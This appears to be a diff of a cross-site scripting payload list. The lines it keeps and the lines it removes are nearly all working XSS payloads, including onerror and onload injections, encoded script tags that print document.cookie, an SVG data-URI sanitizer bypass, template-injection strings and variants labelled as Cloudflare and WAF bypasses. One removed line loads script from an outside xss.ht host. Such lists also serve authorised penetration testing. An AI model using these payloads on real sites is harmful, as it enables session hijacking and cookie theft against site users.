@@ -1,5 +1,5 @@
 
-n_vis=xssx'*$.getScript`//593.xss.ht`//;
+"> <img src=x onerror="alert(1)">
 
 <a href="https://www.evil.com/">Click here </a>
 
@@ -90,7 +90,6 @@ javascript:alert(document.domain)
 <%= sanitize "<svg><use href=\"data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB4bWxuczp4bGluaz0naHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluaycgd2lkdGg9JzEzMzcnIGhlaWdodD0nMTMzNyc+CjxpbWFnZSBocmVmPSIxIiBvbmVycm9yPSJhbGVydCh3aW5kb3cub3JpZ2luKSIgLz4KPC9zdmc+#x\"/></svg>", tags: %w(svg use) %>
 
 
-Cloudflare XSS Protection Bypass 👇
 "%3e%3cImG%20sRC=X%20OneRRoR=alert(document.cookie)%20"%3c
 
 "><Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBYU1MgQG1fa2VsZXBjZQ=="))>
@@ -128,19 +127,11 @@ foo"><svG/onLoAd=confirm(1337)>
 <img src=x onerror=alert(1)>
 "><img src=x on0x=1 onerror=alert(/POC/)>
 
-
  [alert][0].call(this,1)
 
 %26%2302java%26%23115cript:alert(document.domain)
 
 “>%0D%0A%0D%0A<x ‘=”foo”><x foo=’><img src=x onerror=javascript:alert(cloudfrontbypass)//’>
-
-
-You can always make use of the following characters to bypass your WAF:
-
-+, -, %, /
-Example: "/alert()/"//
-Example : "%alert()%"//
 
 
 %7B%7Bconstructor.constructor(%27alert(1337)%27)()%7D%7D
@@ -151,9 +142,5 @@ Example : "%alert()%"//
 
 <%2FScriPt><sCripT+class%3DDrakenKun>document.write(document.cookie);<%2FsCriPt>
 
-
 "><img%20src=x%20onerror="alert(%27POC%20By%20DrakenKun%27)"
 
-alert%28%29
-
-<?php header("Content-Type: application/javascript"); ?>
